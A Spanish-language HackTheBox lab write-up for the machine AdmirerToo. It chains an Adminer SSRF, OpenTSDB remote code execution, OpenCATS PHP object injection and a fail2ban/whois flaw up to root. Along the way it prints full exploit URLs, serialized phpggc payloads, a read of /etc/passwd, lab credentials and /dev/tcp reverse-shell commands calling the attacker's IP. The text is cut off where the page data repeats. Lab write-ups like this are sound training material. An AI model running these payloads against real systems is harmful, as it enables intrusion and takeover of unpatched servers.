{"pageProps":{"markdownData":"{\"orig\":\"---\\ntitle: HackTheBox - Maquina AdmirerToo \\nsubtitle: Paso a paso de la explotación de la máquina AdmirerToo de HackTheBox.\\ndificultad: Hard\\nos: Sistema Operativo Linux\\ndate: 2024-02-08\\ntags:\\n    - HackTheBox\\n---\\n\\n## Enumeración de Puertos\\n\\nEnumeración de puertos TCP\\n~~~bash\\nsudo nmap -sS -p22,80,4242,4329 10.129.96.181 -A\\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:50 EDT\\nNmap scan report for 10.129.96.181\\nHost is up (0.14s latency).\\n\\nPORT     STATE    SERVICE        VERSION\\n22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\\n| ssh-hostkey: \\n|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)\\n|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)\\n|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)\\n80/tcp   open     http           Apache httpd 2.4.38 ((Debian))\\n|_http-title: Admirer\\n|_http-server-header: Apache/2.4.38 (Debian)\\n4242/tcp filtered vrml-multi-use\\n4329/tcp closed   publiqare-sync\\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\\nTCP/IP fingerprint:\\nOS:SCAN(V=7.92%E=4%D=6/16%OT=22%CT=4329%CU=36711%PV=Y%DS=2%DC=T%G=Y%TM=62AB\\nOS:435C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)\\nOS:OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505\\nOS:ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)\\nOS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%\\nOS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\\nOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=\\nOS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF\\nOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40\\nOS:%CD=S)\\n\\nNetwork Distance: 2 hops\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nTRACEROUTE (using port 4329/tcp)\\nHOP RTT       ADDRESS\\n1   136.94 ms 10.10.14.1\\n2   137.13 ms 10.129.96.181\\n\\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 24.52 seconds\\n\\n~~~\\n\\n## Enumeración de Servicios  \\n\\n**Puerto 80 (HTTP)**:\\n\\n![](/AdmirerToo/Pasted_image_20220616103908.png)\\n\\nIntentamos acceder al archivo robots.txt. Nos encontramos con un error 404, en donde es indicado el dominio admirer-gallery.htb. Por lo que agregamos este dominio a nuestro archivo /etc/hosts\\n\\n~~~http\\nHTTP/1.1 404 Not Found\\nDate: Thu, 16 Jun 2022 14:59:54 GMT\\nServer: Apache/2.4.38 (Debian)\\nContent-Length: 326\\nConnection: close\\nContent-Type: text/html; charset=iso-8859-1\\n\\n<!DOCTYPE HTML PUBLIC \\\"-//IETF//DTD HTML 2.0//EN\\\">\\n<html><head>\\n<title>404 Not Found</title>\\n</head><body>\\n<h1>Not Found</h1>\\n<p>The requested URL was not found on this server.</p>\\n<hr>\\n<address>Apache/2.4.38 (Debian) Server at <a href=\\\"mailto:webmaster@admirer-gallery.htb\\\">10.129.96.181</a> Port 80</address>\\n</body></html>\\n\\n~~~\\n\\nLuego de hacer una enumeración del sistema, intentamos encontrar subdominios o VHOSTS en el servidor con gobuster:\\n\\n~~~bash\\ngobuster vhost  -u http://admirer-gallery.htb -w Repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\\n===============================================================\\nGobuster v3.1.0\\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\\n===============================================================\\n[+] Url:          http://admirer-gallery.htb\\n[+] Method:       GET\\n[+] Threads:      10\\n[+] Wordlist:     Repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\\n[+] User Agent:   gobuster/3.1.0\\n[+] Timeout:      10s\\n===============================================================\\n2022/06/16 11:07:18 Starting gobuster in VHOST enumeration mode\\n===============================================================\\nFound: db.admirer-gallery.htb (Status: 200) [Size: 2568]\\n                                                        \\n===============================================================\\n2022/06/16 11:08:29 Finished\\n===============================================================\\n~~~\\n\\nVerificamos el contenido del dominio db.admirer-gallery.htb\\n\\n![](/AdmirerToo/Pasted_image_20220616111424.png)\\n\\nLa version del software es Admirer 4.7.8\\n\\nSi presionamos sobre el botón Enter (sin la necesidad de ingresar credenciales)  lograremos obtener unas credenciales de acceso a admirer \\n\\n~~~http\\nPOST / HTTP/1.1\\nHost: db.admirer-gallery.htb\\nContent-Length: 162\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: http://db.admirer-gallery.htb\\nContent-Type: application/x-www-form-urlencoded\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nReferer: http://db.admirer-gallery.htb/\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: adminer_sid=ssbd0ec7vb6kjntrvjfm3pcu1m; adminer_key=ca210dee4291ea9afbb692e9291dfefb; adminer_version=4.8.1\\nConnection: close\\n\\nauth%5Bdriver%5D=server&auth%5Bserver%5D=localhost&auth%5Busername%5D=admirer_ro&auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&auth%5Bdb%5D=admirer&auth%5Bpermanent%5D=1\\n~~~\\n\\nDatos recolectados:\\n\\n- **User**: admirer_ro\\n- **Password**: 1w4nn4b3adm1r3d2!\\n\\n\\n\\n\\n## Analisis de vulnerabilidades\\n\\nAdmirer 4.7.8 es vulnerable a ataques SSRF (CVE-2021-21311). El documento que explica como explotar esta vulnerabilidad es el siguiente:\\n\\nhttps://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf\\n\\nPara la prueba de concepto es utilizado el siguiente script en python\\n\\nhttps://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd\\n\\nNo sabemos cual es valor de campo auth[driver] en la request POST por lo que lo buscaremos usando docker y una imagen de admirer 4.7.8\\n\\nEjecutamos los siguientes comandos:\\n\\n\\n~~~bash\\ndocker pull adminer:4.7.8\\n~~~\\n\\n~~~bash\\nsudo docker run  -p 8082:8080 adminer:4.7.8\\n~~~\\n\\nLuego con burpsuite intentamos modificar los parámetros de login al sistema y enviamos una request POST\\n\\n![](/AdmirerToo/Pasted_image_20220616120347.png)\\n\\nLa request es la siguiente:\\n\\n~~~http\\nPOST / HTTP/1.1\\nHost: localhost:8082\\nContent-Length: 114\\nCache-Control: max-age=0\\nsec-ch-ua: \\\"-Not.A/Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"102\\\"\\nsec-ch-ua-mobile: ?0\\nsec-ch-ua-platform: \\\"Linux\\\"\\nUpgrade-Insecure-Requests: 1\\nOrigin: http://localhost:8082\\nContent-Type: application/x-www-form-urlencoded\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nSec-Fetch-Site: same-origin\\nSec-Fetch-Mode: navigate\\nSec-Fetch-User: ?1\\nSec-Fetch-Dest: document\\nReferer: http://localhost:8082/\\nAccept-Encoding: gzip, deflate\\nAccept-Language: es-419,es;q=0.9\\nCookie: adminer_sid=efb4f07c4acae53848f88ecf3b2a81ad; adminer_key=f716493939fc48b347d7a7752a301860; adminer_version=4.8.1\\nConnection: close\\n\\nauth%5Bdriver%5D=elastic&auth%5Bserver%5D=db&auth%5Busername%5D=admin&auth%5Bpassword%5D=admin&auth%5Bdb%5D=asdasd\\n~~~\\n\\nEl payload que utilizaremos será:\\n\\n~~~\\nauth%5Bdriver%5D=elastic&auth%5Bserver%5D=10.10.14.28&auth%5Busername%5D=admin&auth%5Bpassword%5D=admin&auth%5Bdb%5D=asdasd\\n~~~\\n\\nEjecutamos el script hecho en python (es importante agregar el protocolo en la url de redirección, sino no funcionará)\\n\\n~~~bash\\npython2.7 redirect.py --ip 10.10.14.28 --port 80 http://google.com\\nserving at port 80\\n~~~\\n\\nFinalmente en la consola vemos el siguiente resultado:\\n\\n![](/AdmirerToo/Pasted_image_20220616134824.png)\\n\\ny la  respuesta de la aplicación web es:\\n\\n![](/AdmirerToo/Pasted_image_20220616134846.png)\\n\\nAl parecer no puede hacer solicitudes a sistemas externos a la red\\n\\nVamos a hacer una nueva solicitud, pero esta vez será a la página index de admirer\\n\\n~~~bash\\npython2.7 redirect.py --ip 10.10.14.28 --port 80 http://10.129.96.181/index.php\\nserving at port 80\\n~~~\\n\\nComo resultado en la aplicación admirer vemos el contenido HTML del Virtual HOST admirer-gallery.htb\\n\\n![](/AdmirerToo/Pasted_image_20220616135151.png)\\n\\n\\nIntentaremos acceder al puerto 4242 de la máquina objetivo mediante esta vulnerabilidad y logramos obtener la siguiente información:\\n\\n![](/AdmirerToo/Pasted_image_20220616164702.png)\\n\\nEl servicio en el puerto 4242 es OpenTSDB, por lo que buscamos información la aplicación OpenTSDB\\n\\nLa siguiente página menciona un RCE ( CVE-2020-35476) para la aplicación OpenTSDB, esta vulnerabilidad solo está presente en en las versiones 2.4.0 o menos.\\n\\nhttps://github.com/OpenTSDB/opentsdb/issues/2051\\n\\nUsamos el payload descrito en el link anterior y ponemos el script python para redireccionar request a la esucha en el puerto 80.\\n\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json\\\"\\n~~~\\n\\nComo respuesta el sistema nos entrega un error\\n\\n![](/AdmirerToo/Pasted_image_20220616172852.png)\\n\\nEl error termina con la linea:\\n\\n~~~\\nNo such name for 'metrics': 'sys.cpu.nice'\\\\n\\\\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450)\\n~~~\\n\\nEste error nos indica que esta métrica no existe en el sistema, por lo que debemos identificar que otras métricas tiene disponible. Un post en Buffer overflow nos sugiere una solución:\\n\\nhttps://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http\\n\\nPonemos el script python a la escucha de la siguiente forma\\n\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/api/suggest?type=metrics&max=10\\\" \\n~~~\\n\\nLuego de ejecutar el exploit el sistema nos entrega el siguiente resultado:\\n\\n![](/AdmirerToo/Pasted_image_20220616184008.png)\\n\\n~~~\\nhttp.stats.web.hits\\n~~~\\n\\nUtilizaremos esta metrica para explotar el RCE\\n\\n## Explotation\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json\\\"\\n~~~\\n\\nAl parecer funcionó correctamente, ya que el mensaje entregado es completamente nuevo.\\n\\n![](/AdmirerToo/Pasted_image_20220616184219.png)\\n\\n## Obteniendo una Shell\\n\\nAhora intentamos obtener una shell reversa:\\n\\nEnviaremos nuestro payload codificado en base64:\\n\\n~~~bash\\necho \\\"/bin/bash -l > /dev/tcp/10.10.14.28/443 0<&1 2>&1\\\" | base64\\n~~~\\n\\nEl payload final sera el siguiente\\n\\n~~~bash\\necho+\\\\\\\"L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMjgvNDQzIDA8JjEgMj4mMQo=\\\\\\\"|base64+-d|bash\\n~~~\\n\\nFinalmente agregamos nuestro payload al script que explota la vulnerabilidad de OpenTSDB\\n\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo+\\\\\\\"L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMjgvNDQzIDA8JjEgMj4mMQo=\\\\\\\"|base64+-d|bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json\\\"\\n~~~\\n\\n\\n\\n![](/AdmirerToo/Pasted_image_20220616192757.png)\\n\\n\\n## Enumeracion de sistemas\\n\\nEnumeramos el directorio /var/www/adminer/plugins/data, dónde encontramos el archivo servers.php y su contenido es:\\n\\n~~~php\\n<?php\\nreturn [\\n  'localhost' => array(\\n//    'username' => 'admirer',\\n//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',\\n// Read-only account for testing\\n    'username' => 'admirer_ro',\\n    'pass'     => '1w4nn4b3adm1r3d2!',\\n    'label'    => 'MySQL',\\n    'databases' => array(\\n      'admirer' => 'Admirer DB',\\n    )\\n  ),\\n];\\n\\n~~~\\n\\nPosibles credenciales\\n\\n- **Password**: 1w4nn4b3adm1r3d2!\\n- **Password**: bQ3u7^AxzcB7qAsxE3\\n\\nIdentificamos los usuarios del sistema:\\n\\n~~~bash\\ncat /etc/passwd | grep sh\\nroot:x:0:0:root:/root:/bin/bash\\nopentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false\\njennifer:x:1002:100::/home/jennifer:/bin/bash\\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\\n~~~\\n\\n\\nIntentamos acceder a la máquina mediante SSH con las siguientes credenciales:\\n\\n- **Usuario**: jennifer\\n- **Password**: bQ3u7^AxzcB7qAsxE3\\n\\n### Enumeración como Jennifer\\n\\n![](/AdmirerToo/Pasted_image_20220616194251.png)\\n\\nLogramos acceso al sistema\\n\\nIdentificamos los puertos abiertos con netstat -ano\\n\\n~~~bash\\nActive Internet connections (servers and established)\\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)\\ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)\\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)\\ntcp        0      0 10.129.96.181:55074     10.10.14.28:443         CLOSE_WAIT  off (0.00/0/0)\\ntcp        0     36 10.129.96.181:22        10.10.14.28:47588       ESTABLISHED on (0.34/0/0)\\ntcp6       0      0 :::16030                :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::16010                :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::4242                 :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.0.1:2181          127.0.0.1:43884         ESTABLISHED off (0.00/0/0)\\ntcp6       0      0 127.0.1.1:16000         127.0.1.1:37563         ESTABLISHED keepalive (5315.17/0/0)\\ntcp6       0      0 127.0.0.1:2181          127.0.0.1:43894         ESTABLISHED off (0.00/0/0)\\ntcp6       0      0 127.0.0.1:51310         127.0.1.1:16020         TIME_WAIT   timewait (31.89/0/0)\\ntcp6       0      0 127.0.0.1:43910         127.0.0.1:2181          ESTABLISHED off (0.00/0/0)\\n~~~\\n\\nNotamos un servicio corriendo en el puerto 8080. Intentamos acceder con Curl a la aplicación identificandola como OpenCATS  versión  0.9.5.2\\n\\n### Opencats\\n\\nIdentificamos una potencial vulnerabilidad (CVE-2021-25294) en el siguiente link:\\n\\nhttps://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html\\n\\nHacemos un port forwarding con los siguientes comandos\\n\\n![](/AdmirerToo/Pasted_image_20220616232051.png)\\n\\nFinalmente accedermos a la pagina en nuestra maquina local\\n\\n![](/AdmirerToo/Pasted_image_20220616232118.png)\\n\\nIngresamos al sistema con las credenciales de jennifer\\n\\n- **Usuario**: jennifer\\n- **Password**: bQ3u7^AxzcB7qAsxE3\\n\\n\\n### Fail2ban\\n\\nFile2ban es una herramienta que evita el uso de ataques de fuerza bruta baneando la correspondiente IP.\\n\\nEn el directorio /etc identificamos el software fail2ban, este posee una vulnerabilidad (CVE-2021-32749) RCE basado en otros dos software mail y whois. Este último usa un archivo de configuración en el directorio /usr/local/etc\\n\\nhttps://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm \\n\\n## Elevación de privilegios\\n\\nPrimero intentamos crear el archivo whois.conf en el directorio /usr/local/etc con la vulnerabilidad de opencats\\n\\n\\ncreamos el archivo whois.conf basados en el siguiente (ejemplo)[https://gist.github.com/thde/3890aa48e03a2b551374]\\n\\n~~~\\n##\\n# WHOIS servers for new TLDs (http://www.iana.org/domains/root/db)\\n# Current as of 2017-12-10 UTC\\n##\\n\\n\\\\.aarp$ whois.nic.aarp\\n\\\\.abarth$ whois.afilias-srs.net\\n\\\\.abbott$ whois.afilias-srs.net\\n\\\\.abbvie$ whois.afilias-srs.net\\n\\\\.abc$ whois.nic.abc\\n\\\\.abogado$ whois.nic.abogado\\n\\\\.abudhabi$ whois.nic.abudhabi\\n~~~\\n\\nNotamos que la primera parte es una expresión regular mientras que la segunda es el DNS del respectivo TLD\\n\\n\\nNuestro archivo es:\\n\\n~~~\\n10.10.14.8 10.10.14.8\\n~~~\\n\\nDescargamos la herramienta (phpgcc)[https://github.com/ambionics/phpggc] y ejecutamos el siguiente comando\\n\\n~~~bash\\nphpggc/phpggc  -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf\\n~~~\\n\\nNos da como resultado lo siguiente:\\n\\n~~~bash\\na%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.8+10.10.14.8%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D\\n~~~\\n\\nLuego en el navegador hacemos una request\\n\\n~~~\\nhttp://localhost:8888//index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.8+10.10.14.8%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D\\n~~~\\n\\nLuego verificamos que el archivo ha sido creado exitosamente, pero su contenido no es el deseado\\n\\n![](/AdmirerToo/Pasted_image_20220617210535.png)\\n\\nModificamos su contenido del archivo whois.conf:\\n\\n~~~\\n]*10.10.14.8 10.10.14.8 #\\n~~~\\n\\nLa modificación se debe a que el primer campo es una expresión regular como vimos en el archivo de ejemplo mas arriba. Por lo que, podemos obviar esta expresión agregando el caracter de cierre de cochetes junto con un asterisco.\\n\\nLuego de hacer el proceso anterior  vemos que el resultado es:\\n\\n~~~bash\\ncat whois.conf                                                                                                                           \\n[{\\\"Expires\\\":1,\\\"Discard\\\":false,\\\"Value\\\":\\\"]*10.10.14.8 10.10.14.8 #\\\\n\\\"}]\\n~~~\\n\\nCon el objetivo de verificar usamos el comando whois y falla\\n\\n![](/AdmirerToo/Pasted_image_20220617211358.png)\\n\\nRevisamos el código fuente de whois para entender como procesa el archivo de configuración whois.conf\\n\\nhttps://github.com/rfc1036/whois/blob/next/whois.c\\n\\nVamos a la función match_config_file\\n\\n![](/AdmirerToo/Pasted_image_20220617211541.png)\\n\\nVemos que tiene un buffer de 512 caracters, eso quiere decir que si agregamos espacios para evitar que los caracteres #\\\\n\\\" sean agregados al buffer el comando puede funcionar\\n\\nEl nuevo payload será el siguiente:\\n\\n~~~\\nhttp://localhost:8888//index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bss%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D\\n~~~\\n\\nLuego de modificar el archivo volvemos a probar el comando whois:\\n\\nPonemos el puerto 43 a al escucha:\\n\\n~~~bash\\nnc -lnvp 43 \\nlistening on [any] 43 ...\\n\\n~~~\\n\\nEjecutamos el comando whois\\n\\n~~~bash\\nwhois 10.10.14.8\\n~~~\\n\\nY en nuestra maquian obvervamos lo siguiente:\\n\\n~~~\\nnc -lnvp 43 \\nlistening on [any] 43 ...\\nconnect to [10.10.14.8] from (UNKNOWN) [10.129.96.181] 40666\\n10.10.14.8\\n~~~\\n\\nAhora debemos explotar  el RCE de fail2ban. Esto lo logramos de la siguiente forma\\n\\nPonemos el puerto 43 a la escucha junto con la entrega del payload para el reverse shell\\n~~~bash\\necho -e \\\"\\\\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.8/443 0>&1'\\\\n\\\" | ncat -lnvp 43\\nNcat: Version 7.92 ( https://nmap.org/ncat )\\nNcat: Listening on :::43\\nNcat: Listening on 0.0.0.0:43\\n\\n~~~\\n\\nPonemos el puerto 443 a la escucha de la shell\\n\\n~~~\\nnc lnvp 443\\n~~~\\n\\nFinalmente intentamos acceder al sistema admirertoo mediante ssh con el usuario root y sin ingresar ninguna contraseña\\n\\n~~~\\nssh root@10.129.96.181\\n~~~\\n\\nLuego del tercer intento, obtenemos una shell como root\\n\\n~~~bash\\nnc -lnvp 443\\nNcat: Version 7.92 ( https://nmap.org/ncat )\\nNcat: Listening on :::443\\nNcat: Listening on 0.0.0.0:443\\nNcat: Connection from 10.129.89.36.\\nNcat: Connection from 10.129.89.36:37446.\\nbash: cannot set terminal process group (1762): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@admirertoo:/# whoami\\nwhoami\\nroot\\nroot@admirertoo:/# \\n~~~\\n\\n\\n\",\"data\":{\"title\":\"HackTheBox - Maquina AdmirerToo\",\"subtitle\":\"Paso a paso de la explotación de la máquina AdmirerToo de HackTheBox.\",\"dificultad\":\"Hard\",\"os\":\"Sistema Operativo Linux\",\"date\":\"2024-02-08T00:00:00.000Z\",\"tags\":[\"HackTheBox\"]},\"content\":\"\\n## Enumeración de Puertos\\n\\nEnumeración de puertos TCP\\n~~~bash\\nsudo nmap -sS -p22,80,4242,4329 10.129.96.181 -A\\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:50 EDT\\nNmap scan report for 10.129.96.181\\nHost is up (0.14s latency).\\n\\nPORT     STATE    SERVICE        VERSION\\n22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\\n| ssh-hostkey: \\n|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)\\n|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)\\n|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)\\n80/tcp   open     http           Apache httpd 2.4.38 ((Debian))\\n|_http-title: Admirer\\n|_http-server-header: Apache/2.4.38 (Debian)\\n4242/tcp filtered vrml-multi-use\\n4329/tcp closed   publiqare-sync\\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\\nTCP/IP fingerprint:\\nOS:SCAN(V=7.92%E=4%D=6/16%OT=22%CT=4329%CU=36711%PV=Y%DS=2%DC=T%G=Y%TM=62AB\\nOS:435C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)\\nOS:OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505\\nOS:ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)\\nOS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%\\nOS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\\nOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=\\nOS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF\\nOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40\\nOS:%CD=S)\\n\\nNetwork Distance: 2 hops\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nTRACEROUTE (using port 4329/tcp)\\nHOP RTT       ADDRESS\\n1   136.94 ms 10.10.14.1\\n2   137.13 ms 10.129.96.181\\n\\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 24.52 seconds\\n\\n~~~\\n\\n## Enumeración de Servicios  \\n\\n**Puerto 80 (HTTP)**:\\n\\n![](/AdmirerToo/Pasted_image_20220616103908.png)\\n\\nIntentamos acceder al archivo robots.txt. Nos encontramos con un error 404, en donde es indicado el dominio admirer-gallery.htb. Por lo que agregamos este dominio a nuestro archivo /etc/hosts\\n\\n~~~http\\nHTTP/1.1 404 Not Found\\nDate: Thu, 16 Jun 2022 14:59:54 GMT\\nServer: Apache/2.4.38 (Debian)\\nContent-Length: 326\\nConnection: close\\nContent-Type: text/html; charset=iso-8859-1\\n\\n<!DOCTYPE HTML PUBLIC \\\"-//IETF//DTD HTML 